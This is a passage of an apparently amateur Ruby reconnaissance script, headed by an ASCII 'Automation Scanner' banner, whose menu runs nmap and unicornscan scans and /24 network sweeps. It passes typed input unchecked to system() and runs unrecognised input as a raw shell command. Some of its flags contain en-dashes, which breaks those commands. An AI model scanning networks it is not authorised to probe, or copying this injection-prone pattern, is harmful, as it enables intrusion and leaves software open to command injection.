        A:::::A   A:::::A     u::::u    u::::utttttt:::::::tttttt    o:::::ooooo:::::om::::::::::::::::::::::m           a::::atttttt:::::::tttttt     i::::i o:::::ooooo:::::onn:::::::::::::::n       SS::::::SSSSS    c:::::::cccccc:::::c           a::::ann:::::::::::::::nnn:::::::::::::::ne::::::e     e:::::err::::::rrrrr::::::r
       A:::::A     A:::::A    u::::u    u::::u      t:::::t          o::::o     o::::om:::::mmm::::::mmm:::::m    aaaaaaa:::::a      t:::::t           i::::i o::::o     o::::o  n:::::nnnn:::::n         SSS::::::::SS  c::::::c     ccccccc    aaaaaaa:::::a  n:::::nnnn:::::n  n:::::nnnn:::::ne:::::::eeeee::::::e r:::::r     r:::::r
      A:::::AAAAAAAAA:::::A   u::::u    u::::u      t:::::t          o::::o     o::::om::::m   m::::m   m::::m  aa::::::::::::a      t:::::t           i::::i o::::o     o::::o  n::::n    n::::n            SSSSSS::::S c:::::c               aa::::::::::::a  n::::n    n::::n  n::::n    n::::ne:::::::::::::::::e  r:::::r     rrrrrrr
     A:::::::::::::::::::::A  u::::u    u::::u      t:::::t          o::::o     o::::om::::m   m::::m   m::::m a::::aaaa::::::a      t:::::t           i::::i o::::o     o::::o  n::::n    n::::n                 S:::::Sc:::::c              a::::aaaa::::::a  n::::n    n::::n  n::::n    n::::ne::::::eeeeeeeeeee   r:::::r            
    A:::::AAAAAAAAAAAAA:::::A u:::::uuuu:::::u      t:::::t    tttttto::::o     o::::om::::m   m::::m   m::::ma::::a    a:::::a      t:::::t    tttttt i::::i o::::o     o::::o  n::::n    n::::n                 S:::::Sc::::::c     ccccccca::::a    a:::::a  n::::n    n::::n  n::::n    n::::ne:::::::e            r:::::r            
   A:::::A             A:::::Au:::::::::::::::uu    t::::::tttt:::::to:::::ooooo:::::om::::m   m::::m   m::::ma::::a    a:::::a      t::::::tttt:::::ti::::::io:::::ooooo:::::o  n::::n    n::::n     SSSSSSS     S:::::Sc:::::::cccccc:::::ca::::a    a:::::a  n::::n    n::::n  n::::n    n::::ne::::::::e           r:::::r            
  A:::::A               A:::::Au:::::::::::::::u    tt::::::::::::::to:::::::::::::::om::::m   m::::m   m::::ma:::::aaaa::::::a      tt::::::::::::::ti::::::io:::::::::::::::o  n::::n    n::::n     S::::::SSSSSS:::::S c:::::::::::::::::ca:::::aaaa::::::a  n::::n    n::::n  n::::n    n::::n e::::::::eeeeeeee   r:::::r            
 A:::::A                 A:::::Auu::::::::uu:::u      tt:::::::::::tt oo:::::::::::oo m::::m   m::::m   m::::m a::::::::::aa:::a       tt:::::::::::tti::::::i oo:::::::::::oo   n::::n    n::::n     S:::::::::::::::SS   cc:::::::::::::::c a::::::::::aa:::a n::::n    n::::n  n::::n    n::::n  ee:::::::::::::e   r:::::r            
AAAAAAA                   AAAAAAA uuuuuuuu  uuuu        ttttttttttt     ooooooooooo   mmmmmm   mmmmmm   mmmmmm  aaaaaaaaaa  aaaa         ttttttttttt  iiiiiiii   ooooooooooo     nnnnnn    nnnnnn      SSSSSSSSSSSSSSS       cccccccccccccccc  aaaaaaaaaa  aaaa nnnnnn    nnnnnn  nnnnnn    nnnnnn    eeeeeeeeeeeeee   rrrrrrr            
                                                                                                                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                                                                                                                          
                                                                                                                                                                            
                                                                                                                                                                            
                               "
                         puts "[0] Nmap Scan".green
                         puts "[1] Unicorn Scan".green
                            while true do 
                         print "Scanner >>"
                         scanner = gets.chomp
                         if scanner == "0" then 
                            puts 
                            puts "[2] Nmap Os Scan ".blue
                            puts "[3] Nmap TCP Scan".blue
                            puts "[4] Nmap UDB Scan ".blue
                            puts "[5] Nmap All scan".blue
                            puts "[6] Nmap Http Option Scan ".blue
                            puts "[7] Nmap Live target In Network".blue

                            
                         elsif scanner == "1" 
                            puts
                            puts "[8] Services OS ".blue
                            puts "[9] TCP SYN Scan on a whole network ".blue
                            puts "[01] UDP scan on the whole network " .blue     
                        elsif scanner == "2" 
                            system("nmap  -sS -O  #{$url}")
                        elsif scanner == "3" 
                            system("nmap -Pn -sT -sV -p1-65535 #{$url}")
                        elsif scanner == "4" 
                            system("nmap -sU -sV  #{$url}")
                        elsif scanner == "5" 
                            system("nmap -A  #{$url}")
                        elsif scanner == "6" 
                            system("nmap -Pn -p80,443 --script http-methods -sC  #{$url}")
                        elsif scanner == "7" 
                            print "Your Router Ip : "
                            ipp = gets.chomp
                            system("nmap -sn  #{ipp}/24 ")
                        elsif scanner == "8"
                            system("unicornscan #{$url} –Iv")
                        elsif scanner == "9"
                            print "Your Router Ip : "
                            ipp = gets.chomp
                            system("unicornscan -msf -v -I #{ipp}/24")
                        elsif scanner == "01"
                            print "Your Router Ip : "
                            ipp = gets.chomp
                            system("unicornscan –mU –v –I #{ipp}/24")
                        elsif scanner == "exit"
                            break
                        else
                            system("#{scanner}")
                        end
                          end
                    end

            end

end
end                                         
